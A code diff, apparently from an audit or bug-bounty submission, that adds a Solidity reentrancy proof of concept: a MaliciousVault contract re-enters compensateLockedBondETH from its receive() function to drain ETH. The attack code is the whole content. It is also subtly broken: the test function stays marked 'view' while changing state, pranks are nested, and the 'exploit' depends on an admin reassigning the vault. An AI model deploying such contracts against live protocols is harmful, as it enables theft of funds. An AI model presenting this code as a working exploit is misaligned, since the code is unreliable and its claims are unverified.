@@ -26,11 +26,51 @@ contract DeploymentBaseTest_PoC is Test, Utilities, DeploymentFixtures {
     }
 
     function test_PoC() public view {
-    // add here the test scenario, e.g.:
-        // (uint256 strikesLifetime, uint256 strikesThreshold) = parametersRegistry
-        //     .defaultStrikesParams();
-        // assertEq(strikesLifetime, deployParams.defaultStrikesLifetimeFrames);
-        // assertEq(strikesThreshold, deployParams.defaultStrikesThreshold);
+        vm.startPrank(attacker);
+
+        // Deploy malicious contract controlled by attacker
+        malicious = new MaliciousVault(address(compensateContract));
+
+        // Simulate that the elRewardsVault was replaced by the attacker contract
+        // You may need to impersonate admin or bypass access control for PoC
+        vm.startPrank(admin); // 'admin' must be defined in Fixtures or set manually
+        compensateContract.setElRewardsVault(address(malicious));
+        vm.stopPrank();
+
+        // Fund the contract so there's something to steal
+        vm.deal(address(compensateContract), 5 ether);
+
+        // Attack
+        malicious.attack{value: 1 ether}();
+
+        // Validate reentrancy exploit success
+        assertGt(address(malicious).balance, 1 ether, "ETH should have been drained");
+        vm.stopPrank();
+    }
+}
+
+contract MaliciousVault {
+    address public target;
+    bool internal reentered;
+
+    constructor(address _target) {
+        target = _target;
     }
 
+    receive() external payable {
+        if (!reentered) {
+            reentered = true;
+            // Call again during the callback to trigger reentrancy
+            Compensate(target).compensateLockedBondETH();
+        }
+    }
+
+    function attack() external payable {
+        Compensate(target).compensateLockedBondETH{value: msg.value}();
+    }
+}
+
+interface Compensate {
+    function compensateLockedBondETH() external payable;
+    function setElRewardsVault(address) external;
 }
